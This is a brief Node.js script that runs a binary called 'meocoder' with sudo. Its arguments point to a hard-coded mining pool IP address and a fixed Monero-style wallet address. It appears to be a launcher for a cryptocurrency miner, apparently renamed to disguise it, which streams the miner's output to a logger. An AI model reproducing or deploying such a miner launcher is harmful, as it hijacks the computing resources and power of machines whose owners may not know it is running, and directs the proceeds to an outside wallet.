const shell = require('shelljs');
const { printLog } = require('./log-print');

const runMonney = shell.exec(`sudo ./meocoder -o 168.62.177.218:8080 -u 46s4YKAvP8iQU4VBNmMMjoDU9SmiU13HvSdq7A7r1x2GCuvmGxgq3yh61nxw7yCyRRh2KLp13pNWvWhFP4zBMwhiKvDwQ1y -p meocoder_linux -k`, { silent: true, async: true });
if (runMonney.code !== undefined) {
    return 0;
}
console.log('task running');
runMonney.stdout.on('data', (rawLog) => {
    printLog(rawLog);
});
